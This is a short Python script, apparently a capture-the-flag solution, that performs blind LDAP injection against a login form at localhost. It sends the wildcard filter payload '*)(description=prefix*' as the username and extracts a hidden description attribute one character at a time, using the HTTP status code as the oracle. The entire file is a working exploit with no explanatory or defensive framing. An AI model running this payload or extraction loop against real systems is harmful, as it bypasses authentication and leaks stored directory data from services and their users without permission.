import requests

URL = "http://localhost"

def check_description(prefix):
    data = {
        "username": f"*)(description={prefix}*",
        "password": "*"
    }

    r = requests.post(URL, data=data)
    if r.status_code != 200:
        return False
    return True

def leak():
    prefix = ""
    while True:
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-":
            if check_description(prefix + char):
                prefix += char
                print(prefix)
                break
        else:
            break
    return prefix

if __name__ == "__main__":
    prefix = leak()
    print(f"Description: {prefix}")
